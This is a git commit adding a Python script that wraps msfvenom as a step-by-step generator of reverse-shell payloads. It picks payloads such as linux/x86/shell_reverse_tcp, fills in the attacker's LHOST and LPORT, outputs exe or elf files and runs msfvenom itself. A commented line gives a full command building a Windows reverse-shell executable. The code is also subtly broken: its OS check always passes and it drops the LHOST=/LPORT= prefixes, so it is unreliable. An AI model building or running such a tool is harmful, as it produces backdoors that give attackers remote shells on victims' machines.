d297304a69f2ab0d0bc5ec4abc2d8c7c03f362b8
Jaime Serranzana <jcs909@gmail.com>
2022-01-03 23:11:49 -0500

    copy of newest code

---
+++ newest.py
@@ -0,0 +1,208 @@
+#message
+#Varibles/Imports
+import os
+from typing import final
+from colorama import Fore, Back, Style
+import subprocess
+import socket
+
+#Main Script
+#Varibles
+pastPackets = ()
+baseSearch = ("msfvenom -l payloads |")
+finalPacket = ("msfvenom -p ")
+program_call = 'msfvenom'
+arg_one = '-p'
+
+
+#allowable commands
+os.system('cls' if os.name == 'nt' else "printf '\033c'")
+menuOutput = "c", "C", "p", "P"
+
+#Asking the user the target's operating system
+print(Fore.RED + "MSFVenom Wrapper:")
+#Main Menu
+print("Welcome to our MSFVenom wrapper that will help you through creating a packet with step by step questions guided.")
+print()
+print("   Options:  ")
+print()
+print("   C - Create New Packet")
+print("   P - Past Packet ")
+print()
+
+userInput = input(Fore.WHITE + "Command Line: ")
+
+#Testing if the operation system is a valid system if not loop until right
+while userInput not in menuOutput:
+  os.system('cls' if os.name == 'nt' else "printf '\033c'")
+  print(Fore.RED + str(userInput) + " is not a valid option.")
+  print("   Options:  ")
+  print()
+  print("   C - Create New Packet")
+  print("   P - Past Packet ")
+  print()
+  userInput = input(Fore.WHITE + "Command Line: ")
+
+#Payload Creator
+def createPayload():
+  global packetFinal
+  packetCreation = 1
+  global packetSearch
+  os.system('cls' if os.name == 'nt' else "printf '\033c'")
+  print(Fore.RED + "Payload Creation:")
+  print("Welcome, to allow for easier creation of your payload we will run you through some questions limiting to what is best suited for your needs then allowing you to pick from a more directed list of packets.")
+  print()
+  print("   (   If unknown press enter to skip question   )")
+  print()
+
+  #OS Question 1
+  print("   Question 1: What is the targeted operating system? ")
+  print("   Options: linux, mac, windows")
+  print()
+  OS = input(Fore.WHITE + "Command Line: ")
+
+  #If not command for OS
+  operatingSystem = "linux", "windows", "mac"
+  while OS not in operatingSystem:
+   os.system('cls' if os.name == 'nt' else "printf '\033c'")
+   print(Fore.RED + str(OS) + " is not a valid operating system, what is your target's Operating System?")
+   print("Options: Linux, Mac, Windows")
+   print()
+   OS = input(Fore.WHITE + "Command Line: ")
+  
+  #Adds OS to search
+  packetSearch = (str(baseSearch) + " grep " + str(OS) + " |")
+  packetFinal = ""
+
+  while packetCreation == 1:
+    os.system('cls' if os.name == 'nt' else "printf '\033c'")
+
+    #Grep Question 2/...
+    print(Fore.RED + "   Question 2: Are there any certain keys you wish to grep for? ")
+    print("   Examples: reverse, x86, windows")
+    print("   Note: If nothing else just press enter")
+    print()
+    OS = input(Fore.WHITE + "Command Line: ")
+    if OS == "":
+      packetFinal = (str(packetSearch) + " grep -iv meterpreter | grep -v staged")
+      packetCreation = 0
+
+    else:
+      packetSearch += (str(packetFinal) + " grep " + str(OS) + " |")
+  global finalPacket                                                              
+  os.system('cls' if os.name == 'nt' else "printf '\033c'")
+  print(Fore.RED + "Payload Search:")
+  print("   Targeted Search: " + str(packetFinal))
+  print("   Options: please type a targeted package from the list below if you would like to restart and search from something else please type -REDO-")
+  print()
+  #Packages should be here after the end
+  print(Fore.GREEN + "linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell")
+  print("linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6")
+  print()
+  global arg_two
+  arg_two = input(Fore.WHITE + "Command Line: ")
+  if arg_two == "REDO":
+    createPayload()
+
+def  Lportnhost():
+  global finalPacket
+  global ip_address
+  global lPort
+  global arg_three
+  global arg_four
+  os.system('cls' if os.name == 'nt' else "printf '\033c'")
+  #Find Local Host Automation
+  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  s.connect(("8.8.8.8", 80))
+  ip_address = s.getsockname()[0]
+  print(Fore.RED + "   Question 3: Let move onto building the file, is the IP below your current IP if yes please press enter if not please retype your LHOST in the command line? ")
+  print("   IP: " + str(ip_address))
+  print()
+  OS = input(Fore.WHITE + "Command Line: ")
+  
+
+  #If Lhost wrong
+  operatingSystem = ""
+  while OS not in operatingSystem:
+   os.system('cls' if os.name == 'nt' else "printf '\033c'")
+   print(Fore.RED + " What is your LHost that you want?")
+   print()
+   OS = input(Fore.WHITE + "Command Line: ")
+   ip_address = OS
+  
+  finalPacket += ( " LHOST=" + str(ip_address))
+
+  #Lport finder !!!
+  os.system('cls' if os.name == 'nt' else "printf '\033c'")
+  print(Fore.RED + "   Question 4: Pick an unused port ")
+  # print("   IP: " + str(ip_address))
+  print()
+  OS = input(Fore.WHITE + "Command Line: ")
+  lPort = OS
+
+  finalPacket += ( " LPORT=" + str(lPort))
+
+  #Is script for linux or windows?
+  os.system('cls' if os.name == 'nt' else "printf '\033c'")
+  print(Fore.RED + "   Question 5: What format is the targeted machine? ")
+  print("   Options: windows, linux")
+  print()
+  OS = input(Fore.WHITE + "Command Line: ")
+  typeOfMachine = OS
+
+  target = 1
+
+  while target == 1:
+
+    if typeOfMachine == "windows" or "Windows":
+      arg_three = '-f'
+      arg_four = 'exe'
+      # finalPacket += ( " -f exe")
+      target = 0
+
+    if typeOfMachine == "linux" or "Linux":
+      arg_three = '-f'
+      arg_four = 'elf'
+      # finalPacket += ( " -f elf")
+      target = 0
+      
+    else:
+      os.system('cls' if os.name == 'nt' else "printf '\033c'")
+      print(Fore.RED + str(OS) + " is not a valid option.")
+      print("   Options: windows, linux")
+      print()
+      OS = input(Fore.WHITE + "Command Line: ")
+    
+def finlization():
+  global arg_five
+  global arg_six
+  global finalPacket
+  os.system('cls' if os.name == 'nt' else "printf '\033c'")
+  #Type of payload and naming payload
+  print(Fore.RED + "   Question 6: Lastly what would you like to name your packet? ")
+  print()
+  OS = input(Fore.WHITE + "Command Line: ")
+  arg_five = OS
+  arg_six = '-o'
+  # finalPacket += ( " -o " + str(namePacket))
+
+ 
+
+#Main Execution Program
+if userInput == "C" or userInput == "c":
+    createPayload()
+
+#Pick a Packet ( Grep first 10 command for later grep -m 10)
+
+#Finalization of packet config
+Lportnhost()
+finlization()
+os.system('cls' if os.name == 'nt' else "printf '\033c'")
+print(Fore.GREEN + finalPacket)
+# packet_call = str("'"+str(finalPacket.replace(" ","','"))+"'")
+# # print (packet_call)
+print(program_call,arg_one,arg_two,ip_address,lPort,arg_three,arg_four,arg_six,arg_five)
+return_code = subprocess.call([program_call,arg_one,arg_two,ip_address,lPort,arg_three,arg_four,arg_six,arg_five])
+print("output:", return_code)
+# # return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
+# # print("output:", return_code)
